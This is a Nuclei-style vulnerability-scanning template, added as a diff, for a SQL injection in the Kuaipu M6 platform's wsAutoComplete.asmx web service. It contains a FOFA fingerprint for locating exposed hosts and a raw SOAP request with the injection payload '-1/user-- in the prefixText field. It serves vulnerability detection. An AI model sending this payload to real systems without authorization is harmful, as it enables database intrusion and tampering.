@@ -1,0 +1,42 @@
+id: kuaipu-m6-wsautocomplete-sqli
+
+info:
+  name: "快普 M6 WebService wsAutoComplete.asmx SQL 注入"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    f
+      o
+      f
+      a
+      : body="Resource/JavaScript/jKPM6.DateTime.js"
+      
+      快普M6整合管理平台的WebService/wsAutoComplete.asmx接口存在SQL注入漏洞。攻击者可通过构造恶意SQL请求，利用参数过滤机制中的缺陷，执行未授权的数据库操作，包括但不限于数据查询、篡改或删除，进而可能导致系统权限的非授权获取。
+      
+  tags: 快普M6
+
+http:
+- raw:
+  - |
+    POST /WebService/wsAutoComplete.asmx HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/soap+xml;charset=UTF-8;action="http://tempuri.org/GetAccountTitleList"
+
+    <soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tem="http://tempuri.org/">
+       <soap:Header/>
+       <soap:Body>
+          <tem:GetAccountTitleList>
+             <!--Optional:-->
+             <tem:prefixText>'-1/user--</tem:prefixText>
+             <tem:count>1</tem:count>
+          </tem:GetAccountTitleList>
+       </soap:Body>
+    </soap:Envelope>
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [500]
+  - type: word
+    part: body
+    words:
+    - 'nvarchar'
